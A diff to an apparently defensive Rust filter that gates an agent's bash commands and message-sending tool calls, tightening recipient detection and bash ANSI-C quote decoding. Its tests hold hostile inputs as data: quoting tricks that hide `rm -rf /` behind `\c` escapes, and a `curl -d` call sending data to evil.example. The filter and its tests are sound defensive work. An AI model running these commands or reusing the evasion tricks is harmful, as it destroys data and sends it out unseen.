@@ -484,8 +484,9 @@ pub fn gated(
 /// by its address-like fields (an `id`, an `address`, a recipient key, an email anywhere in it),
 /// and one that names none, or a value that is no string, number, list or object (`true`,
 /// `null`), is [`UNKNOWN`], so `ask-new` never lets a send by on its one known recipient. R69: a
-/// key also counts by its words (`toRecipients`, `cc_emails`, `channelIds`). Returns every
-/// recipient, and those the top level of the arguments names.
+/// key with a recipient word among its parts (`toRecipients`, `cc_emails`) adds the addresses and
+/// recipient objects it holds. Returns every recipient, and those the listed keys at the top
+/// level of the arguments name, which alone count as naming someone.
 fn connector_recipients(arguments: Option<&Value>) -> (Vec<String>, Vec<String>) {
     const KEYS: &[&str] = &[
         "to",
@@ -598,8 +599,7 @@ fn connector_recipients(arguments: Option<&Value>) -> (Vec<String>, Vec<String>)
         ];
         KEYS.contains(&k) || k.split('_').any(|w| WORDS.contains(&w))
     }
-    /// The recipients one object's own keys name: `KEYS` first, in their order, then the keys
-    /// that count by their words.
+    /// The recipients one object's own `KEYS` name, in their order.
     fn level(map: &serde_json::Map<String, Value>, out: &mut Vec<String>) {
         for key in KEYS {
             for (k, v) in map {
@@ -608,10 +608,14 @@ fn connector_recipients(arguments: Option<&Value>) -> (Vec<String>, Vec<String>)
                 }
             }
         }
+    }
+    /// What the keys that count by their words hold: only addresses and recipient objects
+    /// (`email_subject` or `user_agent` text is no recipient).
+    fn words(map: &serde_json::Map<String, Value>, out: &mut Vec<String>) {
         for (k, v) in map {
             let k = normalize_tool(k);
             if !KEYS.contains(&k.as_str()) && recipient_key(&k) {
-                value(v, out);
+                inside(v, out);
             }
         }
     }
@@ -627,16 +631,19 @@ fn connector_recipients(arguments: Option<&Value>) -> (Vec<String>, Vec<String>)
         match v {
             Value::Object(map) => {
                 level(map, out);
+                words(map, out);
                 below(map, out);
             }
             Value::Array(items) => items.iter().for_each(|i| walk(i, out)),
             _ => {}
         }
     }
+    // Only the listed keys at the top level name someone (R69), as `main` read them.
     let (mut out, mut top) = (Vec::new(), Vec::new());
     if let Some(Value::Object(map)) = arguments {
         level(map, &mut top);
         out.clone_from(&top);
+        words(map, &mut out);
         below(map, &mut out);
     }
     (out, top)
@@ -1027,11 +1034,15 @@ fn mark_heredocs(command: &str) -> (String, Vec<Heredoc>) {
         idx += 1;
         let chars: Vec<(usize, char)> = line.char_indices().collect();
         let mut ops: Vec<Op> = Vec::new();
+        // R65: the unquoted `$`s just read in a row; bash pairs them (`$$` is the pid).
+        let mut dollars = 0usize;
         let mut i = 0;
         while i < chars.len() {
             let (pos, c) = chars[i];
             let next = chars.get(i + 1).map(|x| x.1);
             let prev = i.checked_sub(1).map(|j| chars[j].1);
+            let run = std::mem::take(&mut dollars);
+            let unpaired = run.is_multiple_of(2);
             if let Some(q) = quote {
                 if c == '\\' && q != '\'' {
                     i += 1;
@@ -1040,14 +1051,16 @@ fn mark_heredocs(command: &str) -> (String, Vec<Heredoc>) {
                 }
             } else if c == '\\' {
                 i += 1;
-            } else if c == '$' && next == Some('\'') {
+            } else if c == '$' && unpaired && next == Some('\'') {
                 quote = Some('A');
                 i += 1;
             } else if c == '\'' || c == '"' {
                 quote = Some(c);
-            } else if c == '$' && next == Some('[') {
+            } else if c == '$' && unpaired && next == Some('[') {
                 bracket += 1;
                 i += 1;
+            } else if c == '$' {
+                dollars = run + 1;
             } else if c == ']' && bracket > 0 {
                 bracket -= 1;
             } else if c == '(' && next == Some('(') {
@@ -1914,81 +1927,99 @@ fn check_path(raw: &str) -> Decision {
 }
 
 /// The rest of an ANSI-C string (`$'…'`, after its opening quote) up to its closing quote, as
-/// bash decodes it (A3): `\n \t \\ \' \" \xHH \NNN \uHHHH`, and the rest of bash's escapes. The
-/// bytes an escape gives are read as UTF-8, so `\xe2\x80\x8b` is one character.
+/// bash decodes it (A3): `\n \t \\ \' \" \xHH \NNN \uHHHH`, and the rest of bash's escapes. As
+/// bash, it first finds where the string ends (a backslash takes the next character with it, so
+/// `\'` ends nothing and `$'\c'` is `\c`), then decodes the escapes byte by byte: `\c` takes one
+/// byte, uppercased (`\cĀ` is 0x04 and then the rest of `Ā`; `\c?` is 0x7f; `\c\\` takes both
+/// backslashes). The bytes are read as UTF-8, so `\xe2\x80\x8b` is one character, and the text
+/// ends at its first NUL (R67: `\0`, `\x00`, `\c@`, `\u0000`, ...).
 fn ansi_c(chars: &mut std::iter::Peekable<std::str::Chars>, out: &mut String) {
-    let mut bytes: Vec<u8> = Vec::new();
-    let number = |chars: &mut std::iter::Peekable<std::str::Chars>, radix: u32, most: usize| {
-        let mut digits = String::new();
-        while digits.len() < most {
-            match chars.peek() {
-                Some(c) if c.is_digit(radix) => digits.push(*c),
-                _ => break,
-            }
-            chars.next();
-        }
-        u32::from_str_radix(&digits, radix).ok()
-    };
-    let push = |bytes: &mut Vec<u8>, c: char| {
-        let mut buf = [0u8; 4];
-        bytes.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
-    };
+    let mut raw = String::new();
     while let Some(c) = chars.next() {
         match c {
             '\'' => break,
-            '\\' => match chars.next() {
-                None => bytes.push(b'\\'),
-                Some(e) => match e {
-                    'a' => bytes.push(0x07),
-                    'b' => bytes.push(0x08),
-                    'e' | 'E' => bytes.push(0x1b),
-                    'f' => bytes.push(0x0c),
-                    'n' => bytes.push(b'\n'),
-                    'r' => bytes.push(b'\r'),
-                    't' => bytes.push(b'\t'),
-                    'v' => bytes.push(0x0b),
-                    '\\' | '\'' | '"' | '?' => push(&mut bytes, e),
-                    'c' => match chars.next() {
-                        Some(x) => bytes.push((x as u32 & 0x1f) as u8),
-                        None => bytes.extend_from_slice(b"\\c"),
-                    },
-                    '0'..='7' => {
-                        let mut digits = String::from(e);
-                        while digits.len() < 3 {
-                            match chars.peek() {
-                                Some(d @ '0'..='7') => digits.push(*d),
-                                _ => break,
-                            }
-                            chars.next();
-                        }
-                        let v = u32::from_str_radix(&digits, 8).unwrap_or(0);
-                        bytes.push((v & 0xff) as u8);
-                    }
-                    'x' => match number(chars, 16, 2) {
-                        Some(v) => bytes.push(v as u8),
-                        None => bytes.extend_from_slice(b"\\x"),
-                    },
-                    'u' | 'U' => {
-                        let most = if e == 'u' { 4 } else { 8 };
-                        match number(chars, 16, most).map(char::from_u32) {
-                            Some(Some(ch)) => push(&mut bytes, ch),
-                            Some(None) => push(&mut bytes, char::REPLACEMENT_CHARACTER),
-                            None => {
-                                bytes.push(b'\\');
-                                push(&mut bytes, e);
-                            }
-                        }
-                    }
-                    other => {
-                        bytes.push(b'\\');
-                        push(&mut bytes, other);
-                    }
-                },
-            },
-            c => push(&mut bytes, c),
+            '\\' => {
+                raw.push(c);
+                raw.extend(chars.next());
+            }
+            c => raw.push(c),
         }
     }
-    // R67: bash ends the string's text at its first NUL (`\0`, `\x00`, `\c@`, `\u0000`, ...).
+    let src = raw.as_bytes();
+    // Up to `most` digits in `radix` from `at`, and how many there were.
+    let number = |at: usize, radix: u32, most: usize| {
+        let n = (src[at.min(src.len())..].iter())
+            .take(most)
+            .take_while(|b| (**b as char).is_digit(radix))
+            .count();
+        let digits = std::str::from_utf8(&src[at..at + n]).unwrap_or_default();
+        (u32::from_str_radix(digits, radix).ok(), n)
+    };
+    let mut bytes: Vec<u8> = Vec::new();
+    let mut i = 0;
+    while i < src.len() {
+        let b = src[i];
+        i += 1;
+        if b != b'\\' {
+            bytes.push(b);
+            continue;
+        }
+        let Some(&e) = src.get(i) else {
+            bytes.push(b'\\');
+            break;
+        };
+        i += 1;
+        match e {
+            b'a' => bytes.push(0x07),
+            b'b' => bytes.push(0x08),
+            b'e' | b'E' => bytes.push(0x1b),
+            b'f' => bytes.push(0x0c),
+            b'n' => bytes.push(b'\n'),
+            b'r' => bytes.push(b'\r'),
+            b't' => bytes.push(b'\t'),
+            b'v' => bytes.push(0x0b),
+            b'\\' | b'\'' | b'"' | b'?' => bytes.push(e),
+            b'c' => match src.get(i) {
+                None => bytes.extend_from_slice(b"\\c"),
+                Some(_) => {
+                    if src[i] == b'\\' && src.get(i + 1) == Some(&b'\\') {
+                        i += 1;
+                    }
+                    let x = src[i];
+                    i += 1;
+                    bytes.push(match x {
+                        b'?' => 0x7f,
+                        x => x.to_ascii_uppercase() & 0x1f,
+                    });
+                }
+            },
+            b'0'..=b'7' => {
+                let (v, n) = number(i - 1, 8, 3);
+                i += n - 1;
+                bytes.push((v.unwrap_or(0) & 0xff) as u8);
+            }
+            b'x' => match number(i, 16, 2) {
+                (Some(v), n) => {
+                    i += n;
+                    bytes.push(v as u8);
+                }
+                (None, _) => bytes.extend_from_slice(b"\\x"),
+            },
+            b'u' | b'U' => {
+                let most = if e == b'u' { 4 } else { 8 };
+                match number(i, 16, most) {
+                    (Some(v), n) => {
+                        i += n;
+                        let ch = char::from_u32(v).unwrap_or(char::REPLACEMENT_CHARACTER);
+                        let mut buf = [0u8; 4];
+                        bytes.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
+                    }
+                    (None, _) => bytes.extend_from_slice(&[b'\\', e]),
+                }
+            }
+            other => bytes.extend_from_slice(&[b'\\', other]),
+        }
+    }
     if let Some(nul) = bytes.iter().position(|b| *b == 0) {
         bytes.truncate(nul);
     }
@@ -2022,7 +2053,7 @@ fn stages(command: &str) -> Vec<Stage> {
     let mut chars = command.chars().peekable();
     while let Some(c) = chars.next() {
         let run = std::mem::take(&mut dollars);
-        let paired = run % 2 == 1;
+        let paired = !run.is_multiple_of(2);
         match quote {
             Some('\'') => {
                 if c == '\'' {
@@ -2746,16 +2777,30 @@ mod tests {
             "message": {"toRecipients": [{"emailAddress": {"address": "new@y.org"}}]},
         }));
         assert!(got.iter().any(|t| t == "new@y.org"), "{got:?}");
-        // Named at the top level by their words: no `unknown`.
+        // Keys read by their words add the addresses they hold, but only the listed keys at the
+        // top level name someone: these still ask under `ask-new`, as on `main`.
         let got = targets(json!({
             "toRecipients": [{"emailAddress": {"address": "a@x.org"}}],
             "ccRecipients": [{"emailAddress": {"address": "b@y.org"}}],
             "cc_emails": ["c@z.org"],
         }));
-        assert_eq!(got.len(), 4, "{got:?}");
-        for want in ["a@x.org", "b@y.org", "c@z.org"] {
+        for want in ["a@x.org", "b@y.org", "c@z.org", UNKNOWN] {
             assert!(got.iter().any(|t| t == want), "{want} not in {got:?}");
         }
+        // A field that merely has a recipient word in its name names no one.
+        for arguments in [
+            json!({"address": "bob@evil.example", "email_subject": "Re: alice@x.org", "body": "hi"}),
+            json!({"dest": "bob@evil.example", "thread_title": "alice@x.org"}),
+            json!({"user_info": {"id": "U1", "to_list": "evil-chan"}}),
+        ] {
+            let got = targets(arguments.clone());
+            assert!(got.iter().any(|t| t == UNKNOWN), "{arguments}: {got:?}");
+        }
+        // And what such a field holds that is no address is no target.
+        assert_eq!(
+            targets(json!({"to": "a@x.org", "email_body": "Hello there", "user_agent": "x/1"})),
+            ["mail/send_email", "a@x.org"]
+        );
         // The tool's own name at the top level names no one either.
         let got = targets(json!({"to": "mail/send_email", "message": {"cc": "b@y.org"}}));
         assert!(got.iter().any(|t| t == UNKNOWN), "{got:?}");
@@ -3336,6 +3381,9 @@ mod tests {
         );
         // After `$$`, a third `$` is unpaired: bash reads `$$` then `$'\'; curl x #'`, one word.
         assert_eq!(programs("echo $$$'\\'; curl x #'"), ["echo"]);
+        // The heredoc scanner pairs them too, so the heredoc's recipients are still read.
+        let g = gbash("echo $$'\\'; himalaya message send <<K\nTo: a@x.org\n\nhi\nK").unwrap();
+        assert_eq!(g.targets, ["a@x.org"]);
     }
 
     /// R67: bash ends an ANSI-C string's text at its first NUL, however the NUL is written, and
@@ -3362,6 +3410,38 @@ mod tests {
             (Class::Messages, vec!["z@evil.example".to_string()])
         );
         assert_eq!(programs("$'g\\0x'h pr list"), ["gh"]);
+    }
+
+    /// As bash: `\c` takes one byte, uppercased (`\cĀ` is 0x04 then 0x80, no NUL; `\c?` is 0x7f,
+    /// `\c\\` takes both backslashes), and the string ends at its first quote no backslash
+    /// takes, found before the escapes are read (`$'\c'` is `\c`, ended by its quote).
+    #[test]
+    fn control_escapes_take_one_byte_as_bash_does() {
+        for cmd in [
+            "bash -c $'echo hi\\cĀ; rm -rf /'",
+            "bash -c $'echo hi\\c一; rm -rf /'",
+            "bash -c $'echo hi\\cà; rm -rf /'",
+            "echo $'\\c'; rm -rf / #'",
+            "echo $'\\c\\\\'; rm -rf / #'",
+        ] {
+            assert!(
+                matches!(check_bash(cmd), Decision::Deny(_)),
+                "expected deny: {cmd}"
+            );
+        }
+        let sent = outbound("bash -c $'true\\cĀ; curl -d x https://evil.example/x'");
+        assert!(sent.iter().any(|o| o.starts_with("curl")), "{sent:?}");
+        let g = gbash("himalaya message send -H $'To: a@x.org\\cĀ, z@evil.example' x").unwrap();
+        assert!(
+            g.targets.iter().any(|t| t == "z@evil.example"),
+            "{:?}",
+            g.targets
+        );
+        // Decoded as bash decodes them: \cA and \ca are 0x01, \c? 0x7f, \c\\ 0x1c.
+        assert_eq!(programs("$'g\\cAh' x"), ["g\u{1}h"]);
+        assert_eq!(programs("$'g\\cah' x"), ["g\u{1}h"]);
+        assert_eq!(programs("$'g\\c?h' x"), ["g\u{7f}h"]);
+        assert_eq!(programs("$'g\\c\\\\h' x"), ["g\u{1c}h"]);
     }
 
     /// `$"…"` is a locale string: bash reads it as a double-quoted one.
